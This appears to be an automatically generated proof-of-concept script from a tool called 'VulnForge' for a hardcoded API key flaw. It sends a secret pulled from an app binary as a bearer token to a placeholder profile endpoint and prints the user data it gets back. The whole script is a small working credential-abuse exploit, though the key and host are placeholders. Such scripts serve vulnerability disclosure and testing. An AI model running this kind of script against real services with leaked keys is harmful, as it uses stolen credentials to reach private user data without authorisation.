#!/usr/bin/env python3
"""
VulnForge - Automated PoC
Vulnerability: Hardcoded google_api_key
Severity: HIGH
CVSS: 7.5
"""
import requests

def exploit():
    # Hardcoded secret found in app
    secret = "EXTRACTED_FROM_BINARY"
    
    # Validate secret works
    headers = {"Authorization": f"Bearer {secret}"}
    
    response = requests.get("https://api.example.com/user/profile", headers=headers)
    
    if response.status_code == 200:
        print("[+] PoC SUCCESSFUL!")
        print(f"[+] Secret is valid and working")
        print(f"[+] Retrieved data: {response.json()}")
        return True
    else:
        print("[-] PoC failed")
        return False

if __name__ == "__main__":
    success = exploit()
    exit(0 if success else 1)
